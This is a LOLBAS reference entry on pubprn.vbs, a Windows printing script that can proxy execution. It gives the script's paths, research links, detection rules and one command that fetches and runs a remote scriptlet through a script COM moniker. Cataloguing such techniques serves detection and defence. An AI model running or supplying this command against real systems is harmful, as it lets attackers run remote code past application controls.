---
title: "Pubprn.vbs"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Scripts/Pubprn/
fetched_at: 2026-09-20T17:16:37Z
license: unspecified
category: windows
---

Proxy execution with Pubprn.vbs

## Paths
- C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
- C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs

## Resources
- [https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)
- [https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology](https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology)
- [https://github.com/enigma0x3/windows-operating-system-archaeology](https://github.com/enigma0x3/windows-operating-system-archaeology)

## Acknowledgements
- Matt Nelson ([@enigma0x3](https://twitter.com/@enigma0x3))

## Detections
- BlockRule: [https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml](https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml)

## Execute

1. Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection

```
pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
```

   - Use case: Proxy execution

   - Privileges required: User

   - Operating systems: Windows 10

   - ATT&CK® technique: T1216.001

   - Tags: Execute: SCT
